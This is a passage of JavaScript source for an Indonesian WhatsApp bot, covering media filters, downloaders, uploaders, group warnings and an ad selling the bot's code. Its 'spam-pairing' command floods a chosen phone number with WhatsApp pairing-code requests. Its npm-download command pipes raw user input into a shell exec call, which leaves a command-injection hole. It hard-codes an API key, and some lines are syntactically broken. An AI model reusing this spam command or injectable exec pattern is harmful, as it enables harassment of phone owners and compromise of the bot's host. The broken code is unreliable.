 while (tryng < 55) {
 let s = await fetch(`https://ai.xterm.codes/api/img2img/filters/batchProgress?id=${ai.id}`).then(a => a.json());
 if (s.status === 1) {
 console.log("Starting...");
 } 
 if (s.status === 2) {
 console.log("Processing...");
 } 
 if (s.status == 3) {
 return ptz.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m });
 }
 if (s.status == 4) {
 return reply("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
 }
 await new Promise(resolve => setTimeout(resolve, 2000));
 }
 } catch (e) {
 console.error(e);
 reply(`Type-Err! :\n${e}`);
 }
}
break*/

case 'ci': {
 if (!text) return reply(`Kirim perintah ${prefix + command} https://whatsapp.com/channel/xxxxxxxx`);
 if (!args[0] || !args[0].includes('whatsapp.com/channel')) return reply("link tidak valid");

 await ptz.sendMessage(m.chat, {
 react: {
 text: "⏱️",
 key: m.key,
 }
 });

 function formatDate(timestamp) {
 const date = new Date(timestamp * 1000);
 const months = [
 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
 ];
 const day = date.getDate();
 const month = months[date.getMonth()];
 const year = date.getFullYear();
 return `${day} ${month} ${year}`;
 }

 try {
 let result = args[0].split('https://whatsapp.com/channel/')[1];
 let data = await ptz.newsletterMetadata("invite", result);
 let teks = `*NEWSLETTER ID*

*Name:* ${data.name}
*ID*: ${data.id}
*Status*: ${data.state}
*Dibuat Pada*: ${formatDate(data.creation_time)}
*Subscribers*: ${data.subscribers}
*Meta Verify*: ${data.verification}
*React Emoji:* ${data.reaction_codes}
*Description*: ${readmore}
${data.description}
`;

 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{"display_text":"Copy ID","id":"123456789","copy_code":"${data.id}"}`
 },
 ]
 })
 })
 }
 }
 }, { quoted: m });

 await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
 } catch (error) {
 reply("link tidak valid");
 }
}
break
case 'toanime': case 'jadianime': {
     /*if (global.db.data.users[m.sender].limit < 5) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5*/
 if (skizo == "YOUR_APIKEY") return m.reply('Buat dulu apikeynya sendiri di https://skizo.tech/pricing, tenang aja ada yang bayar ada yang gratis juga kok\nlalu masukin ke setting.js')
//if (isBan) return reply('Lu di ban kocak awokwok') 
//if (!q) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
	reply(mess.wait)
ptz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const media = await ptz.downloadAndSaveMediaMessage(quoted)
	//let uploadImage = require('./lib/system/uploadImage')
	let meDia = fs.readFileSync(media);
const anu = await uploadImage2(meDia)
ptz.sendMessage(m.chat, { image: { url: `https://skizoasia.xyz/api/toanime?url=${anu}&apikey=${API.SKIZO}` }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
ptz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}
       //reply('_1 Limit Terpakai ✔️_')
break
case 'toanime2': case 'jadianime2': {
if (!isPrem) return reply(mess.premium)
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply(mess.wait)
const media = await ptz.downloadAndSaveMediaMessage(quoted)
let meDiaa = fs.readFileSync(media);
let anu = await uploadImage2(meDiaa)
ptz.sendMessage(m.chat, { image: { url: `https://widipe.com/toanime?url=${anu}` }, caption: 'Selesai'}, { quoted: m})
}
break

case 'jadizombi': case 'tozombie':{
//if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
	reply(mess.wait)
let q = m.quoted ? m.quoted : m
let media = ptz.downloadAndSaveMediaMessage(quoted)
let meDia = fs.readFileSync(media);
let url = await uploadImage2(meDia)
let anu = await fetch(`https://widipe.com/converter/zombie?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `Here you go!`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: botname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: false,
 ...await prepareWAMessageMedia({ image: {url: data.url}}, { upload: ptz.waUploadToServer })
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
 }],
 }), 
 contextInfo: {
 mentionedJid: [m.sender], 
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363186130999681@newsletter',
 newsletterName: ownername,
 serverMessageId: 143
 }
 }
 })
 }
 }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
}
break
/*case 'ai-ibuki': case 'ai-ibukii': case 'ai-ibukiii': case 'ai-ibukiiii': 
var textt = text;
if (!textt) return reply(`Apaa?`)
textt = textt.trim()
const { GoogleGenerativeAI } = require("@google/generative-ai");
const { GoogleAIFileManager } = require("@google/generative-ai/server");
const Used_Apikey = "API_GEMINI_MU";
const genAI = new GoogleGenerativeAI(Used_Apikey);
const fileManager = new GoogleAIFileManager(Used_Apikey);
try {
if (/image/.test(mime)) {
const modepl = genAI.getGenerativeModel({
 model: "gemini-1.5-pro",
 systemInstruction: `Kamu adalah Tanga Ibuki, kamu sering dipanggil ibukii, jenis kelamin kamu perempuan. Bahasa utamamu adalah Indonesia. Jangan memakai emoji saat kamu membalas pesan. Kamu suka double huruf terakhir saat membalas pesan. Kamu memiliki sifat seperti perempuan lucu dan imut.`,
}); 
const fileBufferr = m.quoted ? await m.quoted.download() : await m.download();
const tempFilePathImg = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
fs.writeFileSync(tempFilePathImg, fileBufferr);
const uploadResponse = await fileManager.uploadFile(tempFilePathImg, {
 mimeType: "image/jpeg",
 displayName: `temp_image_${Date.now()}`,
});
fs.unlinkSync(tempFilePathImg);
console.log(`Uploaded file ${uploadResponse.file.displayName} as: ${uploadResponse.file.uri}`);
const result = await modepl.generateContent([
 {
 fileData: {
 mimeType: uploadResponse.file.mimeType,
 fileUri: uploadResponse.file.uri
 }
 },
 { text: textt },
]);
const jawabann = result.response.text()
var conv = jawabann ? jawabann.replace(/Ibukii: /g, '') : "Maaf, aku ga ngerti";
m.reply(conv)
} else if (/video/.test(mime)) {
const modepl = genAI.getGenerativeModel({
 model: "gemini-1.5-pro",
 systemInstruction: `Kamu adalah Tanga Ibuki, kamu sering dipanggil ibukii, jenis kelamin kamu perempuan. Bahasa utamamu adalah Indonesia. Jangan memakai emoji saat kamu membalas pesan. Kamu suka double huruf terakhir saat membalas pesan. Kamu memiliki sifat seperti perempuan lucu dan imut.`,
}); 
const fileBufferr = m.quoted ? await m.quoted.download() : await m.download();
const tempFilePathImg = path.join(__dirname, `temp_image_${Date.now()}.mp4`);
fs.writeFileSync(tempFilePathImg, fileBufferr);
const uploadResponse = await fileManager.uploadFile(tempFilePathImg, {
 mimeType: "video/mpeg",
 displayName: `temp_image_${Date.now()}`,
});
fs.unlinkSync(tempFilePathImg);
console.log(`Uploaded file ${uploadResponse.file.displayName} as: ${uploadResponse.file.uri}`);
const result = await modepl.generateContent([
 {
 fileData: {
 mimeType: uploadResponse.file.mimeType,
 fileUri: uploadResponse.file.uri
 }
 },
 { text: textt },
]);
const jawabann = result.response.text()
var conv = jawabann ? jawabann.replace(/Ibukii: /g, '') : "Maaf, aku ga ngerti";
m.reply(conv)
} else if (/audio/.test(mime)) {
const modelll = genAI.getGenerativeModel({
 model: "gemini-1.5-flash",
 systemInstruction: `Kamu adalah Tanga Ibuki, kamu sering dipanggil ibukii, jenis kelamin kamu perempuan. Bahasa utamamu adalah Indonesia. Jangan memakai emoji saat kamu membalas pesan. Kamu suka double huruf terakhir saat membalas pesan. Kamu memiliki sifat seperti perempuan lucu dan imut.`,
});
const fileBuffer = await m.quoted.download();
const base64AudioFile = fileBuffer.toString("base64"); // Convert file content to Base64
const tempFilePathAud = path.join(__dirname, `temp_audio_${Date.now()}.mp3`);
fs.writeFileSync(tempFilePathAud, fileBuffer);
const audioFile = await fileManager.uploadFile(tempFilePathAud, {
 mimeType: "audio/mp3",
});
console.log(`Uploaded file ${audioFile.file.uri}`);
fs.unlinkSync(tempFilePathAud);
const result = await modelll.generateContent([
 {
 inlineData: {
 mimeType: "audio/mp3",
 data: base64AudioFile
 }
 },
 { text: textt },
]); 
const jawabann = result.response.text()
var conv = jawabann ? jawabann.replace(/Ibukii: /g, '') : "Maaf, aku ga ngerti";
reply(conv)
} else {
const modelr = genAI.getGenerativeModel({
 model: "gemini-1.5-flash",
 systemInstruction: `Kamu adalah Tanga Ibuki, kamu sering dipanggil ibukii, jenis kelamin kamu perempuan. Bahasa utamamu adalah Indonesia. Jangan memakai emoji saat kamu membalas pesan. Kamu suka double huruf terakhir saat membalas pesan. Kamu memiliki sifat seperti perempuan lucu dan imut.`,
});
const resultr = await modelr.generateContent(textt);
const responser = await resultr.response;
const textr = responser.text();
var conv = textr ? textr.replace(/Ibukii: /g, '') : "Maaf, aku ga ngerti";
reply(conv);
} catch (e) {
reply(`Gabisaa`)
console.log(`error ${e}`)
}
break*/

case 'mediafire2':
case 'mf2':{
if (!text) return reply(`where is the MediaFire URL? *Example:* ${prefix + command} https://www.mediafire.com/file/l5urnlewucsuhmm/LANABOTZ-V.0.3.zip/file`)

async function mediafire(url) {
  const response = await axios.post("https://shinoa.us.kg/api/download/mediafire", {
    text: url,
  }, {
    headers: {
      "accept": "*/*",
      "api_key": "kyuurzy",
      "Content-Type": "application/json"
    }
  });

  return response.data;
}
	
 let donlot = await mediafire(text);
 let result = donlot.data;

const fileType = result.mimetype || getFileTypeFromUrl(result.link);
const fileName = result.filename || path.basename(result.link);

if (fileType === "application/zip" || fileType === "application/pdf" || fileType === "application/vnd.ms-excel") {
 ptz.sendMessage(m.chat, { 
 document: { url: result.link },
 fileName: fileName,
 mimetype: fileType 
 });
 } else if (fileType.startsWith("image/")) {
 ptz.sendMessage(m.chat, { 
 image: { url: result.link },
 caption: fileName 
 });
 } else if (fileType.startsWith("audio/")) {
 ptt (push-to-talk) = true
 ptz.sendMessage(m.chat, { 
 audio: { url: result.link },
 mimetype: fileType,
 ptt: true
 });
 } else if (fileType.startsWith("video/")) {
 ptz.sendMessage(m.chat, { 
 video: { url: result.link },
 caption: fileName 
 });
 } else {
 ptz.sendMessage(m.chat, { 
 document: { url: result.link },
 fileName: fileName,
 mimetype: fileType 
 });
 }
}
break
		case 'playsaluran': {
    if (!isPrem) return reply(mess.owner)
    if (!text) return reply("Contoh! \n> .play Say Yes To Heaven")
    try {
        const yts = require('yt-search')
        const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));//Sebagai Pengalihan Karena Kita Ambil Module Khusus esm Di CommonJS
        const scr = await yts(text)
        const video = scr.videos[0] 
        if (!video) return reply("Video tidak ditemukan.")
        let apiResponse = await fetch(`https://api.agatz.xyz/api/ytplay?message=${text}`)
        let api = await apiResponse.json()
        if (!api || !api.data) return reply("Gagal mendapatkan data dari API.")
        let mp3 = api.data.url.url
        let title = api.data.title
        let thumb = api.data.thumb || "https://f.top4top.io/p_31927oror1.jpg" //Jika ThumbNail Tidak Ada Maka Pakai Pengalihan
        await ptz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key }})
        await ptz.sendMessage(`${global.idch}`, {
            audio: { url: mp3 },
            mimetype: 'audio/mpeg',
            ptt: true,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 9999,
                isForwarded: true,
                externalAdReply: {
                    title: `${title}`,
                    body: `${waktuucapan}`,
                    thumbnailUrl: thumb,
                    sourceUrl: video.url,
                    mediaType: 2
                }
            }
        });
    } catch (error) {
        console.error(error)//Console
        return reply("Terjadi kesalahan saat memproses permintaan.")//Reply
    }
}
break

case 'listwarn': {
 if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin);
 if (!m.isGroup) return reply(mess.group);

 if (!warns[m.chat] || Object.keys(warns[m.chat]).length === 0) {
 return reply('Tidak ada anggota grup yang memiliki peringatan disini.');
 }
 
//
const groupMetadata = await ptz.groupMetadata(m.chat);
const groupName = groupMetadata.subject;
//

 let warnList = `ini Adalah Daftar Peringatan Anggota ${groupName} :\n`;
 for (let user in warns[m.chat]) {
 warnList += `@${user.split('@')[0]}: ${warns[m.chat][user]} peringatan\n`;
 }
 reply(warnList);
}
break;
case 'delwarn': {
 if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin);
 if (!m.isGroup) return reply(mess.group);
 
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 if (!warns[m.chat] || !warns[m.chat][users]) {
 return reply(`Anggota @${users.split('@')[0]} tidak memiliki peringatan.`);
 }
 warns[m.chat][users] -= 1;
 if (warns[m.chat][users] <= 0) {
 delete warns[m.chat][users];
 reply(`Anggota @${users.split('@')[0]} telah berhasil dihapus semua peringatannya.`);
 } else {
 reply(`Peringatan anggota @${users.split('@')[0]} berhasil dihapus. Total peringatan saat ini: ${warns[m.chat][users]}`);
 }
 fs.writeFileSync('./lib/database/antifile/warn.json', JSON.stringify(warns, null, 2));
}
break;
case 'warn': {
 
 if (!(isAdmins || isCreator || isPrem)) return reply(mess.admin);
 if (!m.isGroup) return reply(mess.group);
 if (!isBotAdmins) return reply('bot harus jadi atmin!!');
 
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 if (!warns[m.chat]) {
 warns[m.chat] = {};
 }
 if (!warns[m.chat][users]) {
 warns[m.chat][users] = 0;
 }
 //
const groupMetadata = await ptz.groupMetadata(m.chat);
const groupName = groupMetadata.subject;
//
 warns[m.chat][users] += 1;
 if (warns[m.chat][users] >= 3) { // atur peringatan nya berapa
 await ptz.groupParticipantsUpdate(m.chat, [users], 'remove');
 reply(`Anggota @${users.split('@')[0]} telah dikeluarkan dari grup karena menerima 3 peringatan.`);
 delete warns[m.chat][users];
 await ptz.sendMessage(users, { text: `Anda telah dikeluarkan dari grup *${groupName}* karena menerima 3 peringatan.` });
 } else {
 reply(`Anggota @${users.split('@')[0]} telah diberi peringatan. Total peringatan: ${warns[m.chat][users]}\nanggota akan dikeluarkan jika dia mendapat 3 warn`);
 await ptz.sendMessage(users, { text: `Anda telah menerima peringatan di grup *${groupName}*. Total peringatan Anda: ${warns[m.chat][users]}` });
 }
 fs.writeFileSync('./lib/database/antifile/warn.json', JSON.stringify(warns, null, 2));
}
break;

case 'tolink': case 'tourl': {
 if (!quoted) return reply(`Send/Reply Media With Captions ${prefix + command}`);
 try {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!q.download) return reply("Media tidak dapat diunduh. Pastikan Anda mereply media (gambar/video/stiker/audio).");
//WM : Khaerul jangan apus
 let media = await q.download();
 if (!media || media.length === 0) return reply("Error: Media tidak terunduh dengan benar.");

 const { fromBuffer } = require('file-type');
 const fileType = await fromBuffer(media);
 const ext = fileType ? fileType.ext : 'bin';

 async function uploadTop4top(buffer, ext) {
 const request = require("request");
 const cheerio = require('cheerio');

 return new Promise((resolve, reject) => {
 let req = request({
 url: "https://top4top.io/index.php",
 method: "POST",
 headers: {
 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 "accept-language": "en-US,en;q=0.9,id;q=0.8",
 "cache-control": "max-age=0",
 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAmIhdMyLOrbDawcA',
 'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.585 Mobile Safari/534.11+'
 }
 }, function (error, response, body) {
 if (error) return resolve({ status: 'error', result: 'Upload failed' });

 const $ = cheerio.load(body);
 let result = $('div.alert.alert-warning > ul > li > span a').attr('href');
 if (!result || !/^https?:\/\//.test(result)) {
 resolve({ status: "error", result: "Gagal memperoleh URL. Coba unggah file lain." });
 } else {
 resolve({ status: "Done", result });
 }
 });

 let form = req.form();
 form.append('file_1_', buffer, { filename: `${Math.floor(Math.random() * 10000)}.${ext}` });
 form.append('submitr', '[ رفع الملفات ]');
 });
 }
 async function uploadUguu(buffer, ext) {
 const { exec } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const mediaFilePath = path.join(__dirname, `${Math.floor(Math.random() * 10000)}.${ext}`);
 fs.writeFileSync(mediaFilePath, buffer);

 const execPromise = (command) => {
 return new Promise((resolve, reject) => {
 exec(command, (error, stdout, stderr) => {
 if (error) reject(error);
 else resolve(stdout.trim());
 });
 });
 };

 let response = await execPromise(`curl -s -F files[]=@${mediaFilePath} https://uguu.se/upload`);
 fs.unlinkSync(mediaFilePath);

 try {
 let jsonResponse = JSON.parse(response);
 return { status: 'Done', result: jsonResponse.files[0].url };
 } catch (error) {
 return { status: 'error', result: 'Gagal mengunggah ke Uguu' };
 }
 }
 let uploadResult;
 if (/video|image|audio|gif|sticker/g.test(mime)) {
 if (/sticker/g.test(mime)) {
 media = await q.download();
 ext = 'png';
 }
 uploadResult = await uploadTop4top(media, ext);
 if (uploadResult.status === 'error') {
 uploadResult = await uploadUguu(media, ext);
 }
 } else {
 return reply('Format media tidak didukung untuk konversi URL.');
 }
 if (uploadResult.status === 'Done') {
 let caption = `*[ UPLOAD SUCCESS ]*\n\n🔗 URL: ${uploadResult.result}\n📦 *UKURAN :* ${media.length} Byte`;
 return reply(caption);
 } else {
 return reply(`Gagal mengunggah media: ${uploadResult.result}`);
 }

 } catch (error) {
 console.log(error);
 return reply("Error: " + error.message);
 }
}
break

/*case 'hd3': case 'remini3': {
const sharp = require('sharp');
async function upscaleImage(inputPath) {
 try {
const tempFilePath = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
fs.writeFileSync(tempFilePath, inputPath);
 await sharp(inputPath)
 .resize({ width: 1920, height: 1080, fit: 'inside', withoutEnlargement: false })
 .sharpen()
 .linear(1.2, -(128 * 1.2) + 128) // Increase contrast
 .modulate({ brightness: 0.98 }) // Increase brightness
 .toFile(tempFilePath);
 await ptz.sendMessage(m.chat, {image: fs.readFileSync(tempFilePath)})
fs.unlinkSync(tempFilePath);
 } catch (error) {
 console.error('Error processing image:', error);
 }
}
reply(mess.wait);
//contohnya
const bufferImage = await quoted.download()
return upscaleImage(bufferImage)
}
break*/
		case 'hd3': {
//fungsi
    async function uploadUguu(filePath) {
        const { exec } = require('child_process');
        return new Promise((resolve, reject) => {
            exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (error, stdout) => {
                if (error) return reject('Gagal mengunggah ke Uguu');
                try {
                    let jsonResponse = JSON.parse(stdout);
                    resolve({ status: 'Done', result: jsonResponse.files[0].url });
                } catch (err) {
                    reject('Gagal mengunggah ke Uguu');
                }
            });
        });
    }

    if (!quoted) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
    if (!/image/.test(mime)) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
    reply(mess.wait);
    let media = await ptz.downloadAndSaveMediaMessage(quoted);
    let uploadResult = await uploadUguu(media);
   if (uploadResult.status !== 'Done') {
        return m.reply('*Gagal mengunggah gambar.');
    }
    let cdn = uploadResult.result;  
    let proses;    
    try {
        proses = await (await fetch(`https://widipe.com/remini?url=${cdn}&resolusi=2`)).json();
    } catch (error) {
        console.error('Error fetching from Widipe API:', error);
        return m.reply('*Terjadi kesalahan saat mengambil data dari API.');
    }
    if (!proses.status || !proses.url) {
        return m.reply('*Gagal mendapatkan URL gambar yang telah di-upscale.');
    }
    let imge = proses.url;
    ptz.sendMessage(m.chat, { image: { url: imge }, caption: '*SUCCESS ✅*' }, { quoted: m });
}
break;

case 'st': {
 let gif = 'https://telegra.ph/file/d012f2679eb5f4ad99133.mp4'
 const thumb = 'https://telegra.ph/file/5aa1b252ad838db71c8d5.jpg';
 const txtsc = `━────────────────────━
 
_Source - Code For Sell_
> Price:
[ Rp40.000 / 40k ]


━────────────────────━

Features - List
- Tersedia Key/Password Untuk Keamanan Sc
- Setmenu [ Button Webview, Button Doc, Button Video, Doc, Simple, Image ]
- YTDL Work
- Menu Seperti Digambar
- 2 Verify Type [ Scan Barcode Or Pairing Code ]
- Pilihan Register [ Automatic, Register Name & Age, Code OTP ]
- Support Button
- 800+ Features
- Free Update Permanen
- Cekkhodam [ .cekkhodam name ]
- Kak Gem [ .kakgem ]
- Dan Lainnya

Mau Cek Bot? wa.me/62856586301691

Minat Chat wa.me/6288246327669`
 const aww = `Tertarik? Klik Button Dibawah`;
 const msg = await generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2,
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: aww,
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm,
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia(
 { image: { url: `https://pomf2.lain.la/f/hc76ri6f.jpg` } },
 { upload: ptz.waUploadToServer },
 )),
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 name: "review_and_pay",
 buttonParamsJson: JSON.stringify({
 currency: "IDR",
 payment_configuration: "",
 payment_type: "",
 total_amount: {
 value: 4000000,
 offset: 100
 },
 reference_id: '1000',
 type: "physical-goods",
 order: {
 status: "payment_requested",
 description: "",
 subtotal: {
 value: 4000000,
 offset: 100
 },
 tax: {
 value: 2000,
 offset: 100
 },
 discount: {
 value: 0,
 offset: 100
 },
 order_type: "ORDER",
 items: [
 {
 retailer_id: "7537631592926009",
 product_id: "7538731592926009",
 name: `Source - Code NakanoMD 1.0`,
 amount: {
 value: 450510,
 offset: 1000
 },
 quantity: '900'
 }
 ]
 },
 additional_note: txtsc,
 native_payment_methods: []
 })
 }],
 }),
 contextInfo: {
 stanzaId: m.key.id,
 remoteJid: m.isGroup ? m.sender : m.key.remoteJid,
 participant: m.key.participant || m.sender,
 fromMe: m.key.fromMe,
 quotedMessage: m.message,
 },
 }),
 },
 },
 },
 {},
 );
 if (!m.isGroup) {
 return ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
 });
 }
 
 if (m.isGroup) {
 return ptz.relayMessage(m.chat, {
 requestPaymentMessage: {
 amount: {
 value: 4000000,
 offset: 100,
 currencyCode: 'IDR'
 },
 amount1000: 4000000,
 background: null,
 currencyCodeIso4217: 'IDR',
 expiryTimestamp: 1000000,
 noteMessage: {
 extendedTextMessage: {
 text: txtsc,
 }
 },
 requestFrom: m.sender
 }
 }, {});
 }
}
break

case 'sp': case 'spam-pairing': {
if (!isPrem) return reply('Taktawu')
if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
let [peenis, pepekk = "10"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
reply('succes')
}
break

case 'ytmp44':{
if (!text) return m.reply(` ytmp4 link`)
ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
let obj = await ytmp3(text);
ptz.sendMessage(m.chat, { video: { url: obj.mp4DownloadLink }, mimetype: 'video/mp4', fileName: `youtube.mp4` })
} catch (err) {
console.error(err);
reply(`eror 🗿`);
}

async function ytmp3(videoUrl) {
 return new Promise(async (resolve, reject) => {
 try {
 const searchParams = new URLSearchParams();
 searchParams.append('query', videoUrl);
 searchParams.append('vt', 'mp3');
 const searchResponse = await axios.post(
 'https://tomp3.cc/api/ajax/search',
 searchParams.toString(),
 {
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': '*/*',
 'X-Requested-With': 'XMLHttpRequest'
 }
 }
 );
 if (searchResponse.data.status !== 'ok') {
 throw new Error('Failed to search for the video.');
 } 
 const videoId = searchResponse.data.vid;
 const videoTitle = searchResponse.data.title;
 const mp4Options = searchResponse.data.links.mp4;
 const mp3Options = searchResponse.data.links.mp3;
 const mediumQualityMp4Option = mp4Options[136]; 
 const mp3Option = mp3Options['mp3128']; 
 const mp4ConvertParams = new URLSearchParams();
 mp4ConvertParams.append('vid', videoId);
 mp4ConvertParams.append('k', mediumQualityMp4Option.k);
 const mp4ConvertResponse = await axios.post(
 'https://tomp3.cc/api/ajax/convert',
 mp4ConvertParams.toString(),
 {
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': '*/*',
 'X-Requested-With': 'XMLHttpRequest'
 }
 }
 );
 if (mp4ConvertResponse.data.status !== 'ok') {
 throw new Error('Failed to convert the video to MP4.');
 }
 const mp4DownloadLink = mp4ConvertResponse.data.dlink;
 const mp3ConvertParams = new URLSearchParams();
 mp3ConvertParams.append('vid', videoId);
 mp3ConvertParams.append('k', mp3Option.k);
 const mp3ConvertResponse = await axios.post(
 'https://tomp3.cc/api/ajax/convert',
 mp3ConvertParams.toString(),
 {
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': '*/*',
 'X-Requested-With': 'XMLHttpRequest'
 }
 }
 );
 if (mp3ConvertResponse.data.status !== 'ok') {
 throw new Error('Failed to convert the video to MP3.');
 }
 const mp3DownloadLink = mp3ConvertResponse.data.dlink;
 resolve({
 title: videoTitle,
 mp4DownloadLink,
 mp3DownloadLink
 });
 } catch (error) {
 reject('Error: ' + error.message);
 }
 });
}
};
break

case 'sv': case 'snackvideo': {
if (!text) throw 'Harap masukkan URL SnackVideo!';

 reply(mess.wait);

 try {
 let res = await fetch(`https://api.agatz.xyz/api/snackvideodl?url=${encodeURIComponent(text)}`);
 let json = await res.json();

 if (json.status !== 200) throw 'Gagal mengambil data dari API';

 let { title, thumbnail, media, author, like, comment, share } = json.data;
 let caption = `*Judul:* ${title}\n*Dari:* ${author}\n*Like:* ${like}\n*Komentar:* ${comment}\n*Bagikan:* ${share}\n*Thumbnail:* ${thumbnail}`;

 await ptz.sendMessage(m.chat, {
 video: { url: media },
 caption: caption,
 }, { quoted: m });

 } catch (e) {
 reply(`Terjadi kesalahan: ${e.message}`);
 }
}
break

case 'npmdownloader': case 'npmd': {
 if (!text) return m.reply(`*Contoh* : ${usedPrefix + command} yt-search,versi(opsional)`);

 async function npmdownloader(pkg, pkgver) {
 try {
 const filePath = await new Promise((resolve, reject) => {
 exec(`npm pack ${pkg}@${pkgver}`, (error, stdout) => {
 if (error) {
 m.reply('Error atau Package tidak ditemukan');
 console.error(`exec error: ${error}`);
 reject(error);
 return;
 }
 resolve(stdout.trim());
 });
 });

 const fileName = filePath.split('/').pop();
 const data = await fs.promises.readFile(filePath);
 let Link;
 if (pkgver === 'latest') {
 Link = `https://www.npmjs.com/package/${pkg}`;
 } else {
 Link = `https://www.npmjs.com/package/${pkg}/v/${pkgver}`;
 }
 await ptz.sendMessage(m.chat, {
 document: data,
 mimetype: "application/zip",
 fileName: fileName,
 caption: `- \`Nama\`: ${fileName}\n- \`Versi\`: ${pkgver}\n- \`Link\`: ${Link}`
 }, {
 quoted: m
 });

 await fs.promises.unlink(filePath);
 } catch (err) {
 console.error(`Error: ${err}`);
 }
 }

 ptz.sendMessage(m.chat, {
 react: {
 text: "⏱",
 key: m.key,
 }
 });

 try {
 const [text2, ver] = text.split(",");
 await npmdownloader(text2, ver || 'latest');
 } catch (error) {
 reply('Sepertinya terjadi kesalahan atau package tidak ditemukan');
 }
}
break

case 'spy': 
if (!text) return reply('linknya bg')
reply(mess.wait)

const regexID =
 /(?:https:\/\/open\.spotify\.com\/track\/|spotify:track:)([a-zA-Z0-9]+)/

async function Spotify(url) {
 return new Promise(async (resolve) => {
 let a = await axios.get(`https://api.fabdl.com/spotify/get?url=${url}&`)
 let { gid } = a.data.result

 let getID = url.match(regexID)[1]
 let b = await axios.get(
 `https://api.fabdl.com/spotify/mp3-convert-task/${gid}/${getID}`
 )
 resolve({
 data: a.data.result,
 url: `https://api.fabdl.com${b.data.result.download_url}`,
 })
 })
}
